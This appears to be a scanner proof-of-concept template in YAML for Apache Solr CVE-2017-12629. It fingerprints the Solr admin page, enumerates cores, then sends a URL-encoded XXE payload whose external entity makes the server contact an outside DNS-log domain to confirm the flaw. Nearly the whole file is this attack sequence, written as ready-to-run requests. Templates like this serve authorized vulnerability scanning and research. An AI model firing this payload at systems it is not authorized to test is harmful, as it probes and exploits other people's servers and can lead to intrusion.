name: poc-yaml-Apache-Solr-cve-2017-12629-xxe
description: "dnslog探测成功"
alwaysExecute: true
matchCount: 3
rules:
  - method: GET
    path: /solr/
    follow_redirects: true
    expression:
      status: 200
      body_any:
        - "Solr Admin"      
        - "SolrCore Initialization Failures"
        - "solrAdminApp" 
  - method: GET
    path: /solr/admin/cores?wt=json
    expression:
      status: 200
      body_all: ["responseHeader"]    
    search: '"name":"(?P<core>.*?)"'
  - method: GET
    dnslog: domain
    path: >-
      /solr/{{core}}/select?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22{{domain}}%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&wt=xml&defType=xmlparser
    headers:
      Content-Type: "text/xml"
    follow_redirects: true
    expression:
      dnslogCheck: true